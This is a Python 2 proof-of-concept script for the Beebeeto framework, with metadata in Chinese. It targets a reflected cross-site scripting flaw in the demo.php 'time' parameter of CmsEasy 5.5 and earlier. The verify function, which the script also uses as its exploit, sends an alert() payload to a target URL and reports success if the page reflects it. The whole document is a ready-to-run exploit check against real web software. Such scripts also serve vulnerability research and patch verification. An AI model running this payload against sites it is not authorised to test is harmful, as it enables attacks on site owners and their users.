#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0063',  # 由Beebeeto官方编辑
            'name': 'CmsEasy 5.5 /demo.php 跨站脚本漏洞 POC',  # 名称
            'author': '大孩小孩',  # 作者
            'create_date': '2014-10-10',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'cmseasy',  # 漏洞所涉及的应用名称
            'vul_version': ['<=5.5'],  # 受漏洞影响的应用版本
            'type': 'Cross Site Scripting',  # 漏洞类型
            'tag': ['cmseasy', 'xss', '反射型XSS'],  # 漏洞相关tag
            'desc': 'cmseasy /demo.php文件存在xss漏洞。',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-069363',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/demo.php?time=alert('f4aa169c58007f317b2de0b73cecbd92')"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if "time:alert('f4aa169c58007f317b2de0b73cecbd92')," in content:
            args['success'] = True
            args['poc_ret']['xss_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
